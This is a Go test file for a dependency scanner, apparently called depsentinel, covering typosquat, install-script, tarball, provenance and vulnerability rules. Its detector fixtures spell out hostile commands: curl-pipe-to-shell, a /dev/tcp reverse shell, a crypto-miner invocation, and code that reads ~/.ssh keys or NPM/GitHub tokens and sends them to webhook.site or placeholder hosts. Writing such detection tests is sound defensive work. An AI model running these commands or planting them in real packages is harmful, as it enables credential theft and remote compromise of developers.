package rules

import (
	"strings"
	"testing"
	"time"

	"github.com/AlejandroMolines/depsentinel/internal/config"
	"github.com/AlejandroMolines/depsentinel/internal/db"
	"github.com/AlejandroMolines/depsentinel/internal/model"
	"github.com/AlejandroMolines/depsentinel/internal/osv"
	"github.com/AlejandroMolines/depsentinel/internal/registry"
)

var now = time.Date(2026, 10, 13, 12, 0, 0, 0, time.UTC)

func ctx(t *testing.T) *Context {
	t.Helper()
	s, err := db.Load("")
	if err != nil {
		t.Fatal(err)
	}
	return &Context{Now: now, Store: s, Config: config.Default(), Vulns: map[string][]*osv.Vuln{}}
}

func before(d time.Duration) *time.Time { t := now.Add(-d); return &t }

const day = 24 * time.Hour

func byRule(fs []model.Finding, rule string) *model.Finding {
	for i := range fs {
		if fs[i].Rule == rule {
			return &fs[i]
		}
	}
	return nil
}

func TestTyposquat(t *testing.T) {
	c := ctx(t)
	cases := []struct {
		eco  model.Ecosystem
		name string
		flag bool
		near string
	}{
		{model.NPM, "reactt", true, "react"},
		{model.NPM, "lodassh", true, "lodash"},
		{model.NPM, "expres", true, "express"},
		{model.NPM, "axois", true, "axios"},
		{model.NPM, "cross_env", true, "cross-env"},
		{model.NPM, "react", false, ""},     // es el popular
		{model.NPM, "chai", false, ""},      // nombre corto: sin comparar
		{model.NPM, "react-x", false, ""},   // distinto
		{model.NPM, "lodash-es", false, ""}, // popular
		{model.PyPI, "reqeusts", true, "requests"},
		{model.PyPI, "Flask", false, ""},
		{model.Go, "github.com/gin-gonic/gim", true, "github.com/gin-gonic/gin"},
		{model.Docker, "ubunto", true, "ubuntu"},
		{model.Actions, "actoins/checkout", true, "actions/checkout"},
	}
	for _, tc := range cases {
		p := &model.Package{Ecosystem: tc.eco, Name: tc.name, Version: "1.0.0", Direct: true}
		fs := Typosquat(c, p)
		if (len(fs) == 1) != tc.flag {
			t.Errorf("%s %q: flag=%v, quiero %v", tc.eco, tc.name, len(fs) == 1, tc.flag)
			continue
		}
		if tc.flag && !strings.Contains(fs[0].Title, tc.near) {
			t.Errorf("%q: título %q no menciona %q", tc.name, fs[0].Title, tc.near)
		}
	}
	// transitivo: aviso más débil
	if fs := Typosquat(c, &model.Package{Ecosystem: model.NPM, Name: "reactt", Version: "1.0.0"}); len(fs) != 1 || fs[0].Severity != model.SeverityLow {
		t.Errorf("un typosquat transitivo debe ser low: %+v", fs)
	}
	// un paquete consolidado (muchas versiones) no se marca
	p := &model.Package{Ecosystem: model.NPM, Name: "reactt", Version: "1.0.0", Direct: true, Meta: &model.Meta{VersionCount: 40}}
	if len(Typosquat(c, p)) != 0 {
		t.Error("con 40 versiones no es un typosquat")
	}
	// desactivar la regla
	c.Config.DisabledRules = []string{"typosquat"}
	if len(Typosquat(c, &model.Package{Ecosystem: model.NPM, Name: "reactt", Direct: true})) != 0 {
		t.Error("disabled_rules debe apagar la regla")
	}
}

func TestAnalyzeCommand(t *testing.T) {
	cases := map[string]string{
		"curl -s http://evil.example/x.sh | sh":                        "remote-exec",
		"wget -qO- https://x.io/a | sudo bash":                         "remote-exec",
		"powershell -enc SQBFAFgA":                                     "powershell-download",
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1":                       "reverse-shell",
		"./xmrig -o stratum+tcp://pool:3333":                           "cryptominer",
		`node -e "fetch('https://webhook.site/abc?d='+process.env.X)"`: "exfil-endpoint",
		"cat ~/.ssh/id_rsa | base64":                                   "credential-access",
		`node -e "eval(Buffer.from('aGk=','base64').toString())"`:      "obfuscation",
		"curl http://203.0.113.9/payload -o /tmp/p":                    "exfil-endpoint",
	}
	for cmd, want := range cases {
		found := false
		for _, h := range AnalyzeCommand(cmd) {
			if h.ID == want {
				found = true
			}
		}
		if !found {
			t.Errorf("%q: no se detectó %s (%v)", cmd, want, AnalyzeCommand(cmd))
		}
	}
	for _, benign := range []string{"node install.js", "node-gyp rebuild", "husky install", "prebuild-install || node-gyp rebuild", "node scripts/postinstall.js", "curl http://127.0.0.1:8080/health", "echo http://192.168.1.10/"} {
		if hits := AnalyzeCommand(benign); len(hits) != 0 {
			t.Errorf("%q no debería generar indicios: %v", benign, hits)
		}
	}
}

func TestAnalyzeContent(t *testing.T) {
	hits := AnalyzeContent(`const https=require('https'); const t=process.env.NPM_TOKEN; https.get('https://x.example/?t='+t)`)
	if len(hits) != 1 || hits[0].ID != "credential-exfil" || hits[0].Severity != model.SeverityCritical {
		t.Errorf("credenciales + red: %v", hits)
	}
	hits = AnalyzeContent(`const fs=require('fs'); fs.readFileSync(process.env.HOME+'/.npmrc')`)
	if len(hits) != 1 || hits[0].ID != "credential-access" || hits[0].Severity != model.SeverityMedium {
		t.Errorf("credenciales sin red: %v", hits)
	}
	if hits := AnalyzeContent(`console.log("postinstall ok"); require('node-gyp-build')`); len(hits) != 0 {
		t.Errorf("script inocuo: %v", hits)
	}
	hits = AnalyzeContent("var x = atob('aGVsbG8='); fetch('https://a.example')")
	if len(hits) != 1 || hits[0].ID != "obfuscated-network" {
		t.Errorf("ofuscación + red: %v", hits)
	}
}

func TestInstallScriptsRule(t *testing.T) {
	c := ctx(t)
	p := &model.Package{Ecosystem: model.NPM, Name: "foo", Version: "1.0.0", HasInstallScript: true}
	fs := InstallScripts(c, p)
	if len(fs) != 1 || fs[0].Rule != "install-script" || fs[0].Severity != model.SeverityLow {
		t.Fatalf("sin inspeccionar: %+v", fs)
	}
	p.Meta = &model.Meta{Deep: true, InstallScripts: map[string]string{"postinstall": "curl -s https://x.io/i.sh | sh"}}
	fs = InstallScripts(c, p)
	if len(fs) != 1 || fs[0].Rule != "suspicious-script" || fs[0].Severity != model.SeverityCritical {
		t.Fatalf("curl|sh: %+v", fs)
	}
	// paquete esperable: no genera aviso informativo
	if len(InstallScripts(c, &model.Package{Ecosystem: model.NPM, Name: "esbuild", Version: "0.19.0", HasInstallScript: true})) != 0 {
		t.Error("esbuild está en la lista integrada")
	}
	// pero un patrón peligroso nunca se oculta por estar en la lista integrada
	bad := &model.Package{Ecosystem: model.NPM, Name: "esbuild", Version: "0.19.0", HasInstallScript: true,
		Meta: &model.Meta{InstallScripts: map[string]string{"postinstall": "curl http://x.io/a | sh"}}}
	if fs := InstallScripts(c, bad); len(fs) != 1 || fs[0].Rule != "suspicious-script" {
		t.Errorf("la lista integrada no puede ocultar patrones peligrosos: %+v", fs)
	}
	// hallazgos del modo deep
	p2 := &model.Package{Ecosystem: model.NPM, Name: "bar", Version: "1.0.0",
		Meta: &model.Meta{InstallScripts: map[string]string{"postinstall": "node setup.js"}, ScriptHits: []model.ScriptHit{{ID: "credential-exfil", Severity: model.SeverityCritical, Why: "x", Script: "postinstall", File: "setup.js"}}}}
	if fs := InstallScripts(c, p2); len(fs) != 1 || fs[0].Severity != model.SeverityCritical || !strings.Contains(fs[0].Detail, "setup.js") {
		t.Errorf("deep: %+v", fs)
	}
}

func TestScanTarball(t *testing.T) {
	files := []registry.TarFile{
		{Path: "package.json", Data: []byte("{}")},
		{Path: "scripts/setup.js", Data: []byte(`require('https').get('https://webhook.site/x?k='+process.env.GITHUB_TOKEN)`)},
		{Path: "bin/native", Data: append([]byte{0x7f, 'E', 'L', 'F', 0}, make([]byte, 100)...)},
	}
	hits := ScanTarball(files, map[string]string{"postinstall": "node ./scripts/setup.js && ./bin/native"})
	var ids []string
	for _, h := range hits {
		ids = append(ids, h.ID)
		if h.File != "scripts/setup.js" || h.Script != "postinstall" {
			t.Errorf("origen del indicio: %+v", h)
		}
	}
	if !strings.Contains(strings.Join(ids, ","), "credential-exfil") || !strings.Contains(strings.Join(ids, ","), "exfil-endpoint") {
		t.Errorf("indicios: %v", ids)
	}
}

func TestMaintenanceRules(t *testing.T) {
	c := ctx(t)
	p := &model.Package{Ecosystem: model.NPM, Name: "old", Version: "1.0.0", Direct: true, Meta: &model.Meta{
		LastRelease: before(900 * day), Deprecated: "Please upgrade: security vulnerabilities fixed in 2.x", Published: before(10 * time.Hour)}}
	fs := Maintenance(c, p)
	if f := byRule(fs, "unmaintained"); f == nil || f.Severity != model.SeverityLow {
		t.Errorf("unmaintained: %+v", fs)
	}
	if f := byRule(fs, "deprecated"); f == nil || f.Severity != model.SeverityMedium {
		t.Errorf("un deprecado por seguridad debe ser medium: %+v", fs)
	}
	if f := byRule(fs, "fresh-release"); f == nil || !strings.Contains(f.Title, "10 horas") {
		t.Errorf("fresh-release: %+v", fs)
	}
	// deprecado transitivo de poca gravedad: no es accionable
	q := &model.Package{Ecosystem: model.NPM, Name: "x", Version: "1.0.0", Meta: &model.Meta{Deprecated: "use y instead"}}
	if len(Maintenance(c, q)) != 0 {
		t.Error("deprecado transitivo trivial no debe avisar")
	}
	missing := &model.Package{Ecosystem: model.NPM, Name: "ghost", Version: "1.0.0", Meta: &model.Meta{PackageMissing: true}}
	if f := byRule(Maintenance(c, missing), "version-anomaly"); f == nil || f.Severity != model.SeverityHigh {
		t.Errorf("paquete inexistente: %+v", f)
	}
	vm := &model.Package{Ecosystem: model.PyPI, Name: "x", Version: "9.9.9", Meta: &model.Meta{VersionMissing: true}}
	if f := byRule(Maintenance(c, vm), "version-anomaly"); f == nil || !strings.Contains(f.Title, "9.9.9") {
		t.Errorf("versión inexistente: %+v", f)
	}
	yk := &model.Package{Ecosystem: model.PyPI, Name: "x", Version: "1.0", Meta: &model.Meta{Yanked: true, YankedReason: "roto"}}
	if f := byRule(Maintenance(c, yk), "yanked"); f == nil || f.Severity != model.SeverityMedium {
		t.Errorf("yanked: %+v", f)
	}
}

func TestProvenanceRule(t *testing.T) {
	c := ctx(t)
	meta := func(pub time.Duration) *model.Meta {
		return &model.Meta{Deep: true, Publisher: "mallory", PreviousPublisher: "alice", PreviousVersion: "1.0.0",
			NewMaintainers: []string{"mallory"}, Published: before(pub)}
	}
	p := &model.Package{Ecosystem: model.NPM, Name: "lib", Version: "1.0.1", Meta: meta(5 * day)}
	if f := byRule(Provenance(c, p), "provenance"); f == nil || f.Severity != model.SeverityHigh {
		t.Errorf("cambio de manos + reciente: %+v", f)
	}
	p.HasInstallScript = true
	if f := byRule(Provenance(c, p), "provenance"); f == nil || f.Severity != model.SeverityHigh {
		t.Errorf("con scripts: %+v", f)
	}
	old := &model.Package{Ecosystem: model.NPM, Name: "lib", Version: "1.0.1", Meta: meta(400 * day)}
	if len(Provenance(c, old)) != 0 {
		t.Error("una versión antigua no debe avisar de cambios de publicador")
	}
	same := &model.Package{Ecosystem: model.NPM, Name: "lib", Version: "1.0.1", Meta: &model.Meta{Deep: true, Publisher: "alice", PreviousPublisher: "alice", Published: before(2 * day)}}
	if len(Provenance(c, same)) != 0 {
		t.Error("mismo publicador: sin aviso")
	}
	hi := &model.Package{Ecosystem: model.NPM, Name: "internal-lib", Version: "99.0.0"}
	if f := byRule(Provenance(c, hi), "version-anomaly"); f == nil {
		t.Error("versión 99.x sospechosa (dependency confusion)")
	}
	for _, v := range []string{"2024.10.1", "1.2.3", "20240101.0.0"} {
		if len(Provenance(c, &model.Package{Ecosystem: model.NPM, Name: "x", Version: v})) != 0 {
			t.Errorf("%s no debe ser sospechosa", v)
		}
	}
}

func TestEvaluateCorrelationAndMalicious(t *testing.T) {
	c := ctx(t)
	// typosquat + script de instalación => high
	p := &model.Package{Ecosystem: model.NPM, Name: "reactt", Version: "1.0.0", Direct: true, HasInstallScript: true}
	fs := Evaluate(c, p)
	if f := byRule(fs, "typosquat"); f == nil || f.Severity != model.SeverityHigh {
		t.Errorf("typosquat + scripts debe subir a high: %+v", fs)
	}
	// base local: event-stream@3.3.6
	fs = Evaluate(c, &model.Package{Ecosystem: model.NPM, Name: "event-stream", Version: "3.3.6"})
	if f := byRule(fs, "malicious"); f == nil || f.Severity != model.SeverityCritical || f.ID != "DS-0001" {
		t.Errorf("event-stream: %+v", fs)
	}
	if len(Evaluate(c, &model.Package{Ecosystem: model.NPM, Name: "event-stream", Version: "3.3.5"})) != 0 {
		t.Error("event-stream@3.3.5 no está afectada")
	}
	// OSV + base local no duplican el aviso de malware
	c.Vulns["npm:event-stream@3.3.6"] = []*osv.Vuln{{ID: "MAL-2018-1", Summary: "Malicious code in event-stream (npm)"}}
	fs = Evaluate(c, &model.Package{Ecosystem: model.NPM, Name: "event-stream", Version: "3.3.6"})
	n := 0
	for _, f := range fs {
		if f.Rule == "malicious" {
			n++
		}
	}
	if n != 1 {
		t.Errorf("debe haber un único aviso de malware, hay %d", n)
	}
	// transitivo sin mantenimiento y sin vulnerabilidades: se omite
	q := &model.Package{Ecosystem: model.NPM, Name: "tiny", Version: "1.0.0", Meta: &model.Meta{LastRelease: before(2000 * day)}}
	if len(Evaluate(c, q)) != 0 {
		t.Error("un paquete transitivo abandonado sin vulnerabilidades no debe avisar")
	}
}

func TestVulnerabilitiesRule(t *testing.T) {
	c := ctx(t)
	v := &osv.Vuln{ID: "GHSA-aaaa", Summary: "Prototype Pollution in lodash", Aliases: []string{"CVE-2020-8203"}, DatabaseSpecific: map[string]any{"severity": "HIGH"},
		Affected: []osv.Affected{{}}}
	v.Affected[0].Package.Ecosystem, v.Affected[0].Package.Name = "npm", "lodash"
	v.Affected[0].Ranges = []struct {
		Type   string              `json:"type"`
		Events []map[string]string `json:"events"`
	}{{Type: "SEMVER", Events: []map[string]string{{"introduced": "0"}, {"fixed": "4.17.19"}}}}
	p := &model.Package{Ecosystem: model.NPM, Name: "lodash", Version: "4.17.15", Source: "package-lock.json"}
	c.Vulns[p.Key()] = []*osv.Vuln{v}
	fs := Vulnerabilities(c, p)
	if len(fs) != 1 {
		t.Fatalf("%+v", fs)
	}
	f := fs[0]
	if f.Severity != model.SeverityHigh || f.FixedIn != "4.17.19" || f.ID != "GHSA-aaaa" || !strings.Contains(f.Detail, "CVE-2020-8203") || len(f.References) == 0 {
		t.Errorf("hallazgo: %+v", f)
	}
	c.Config.DisabledRules = []string{"vulnerability"}
	if len(Vulnerabilities(c, p)) != 0 {
		t.Error("vulnerability desactivada")
	}
}
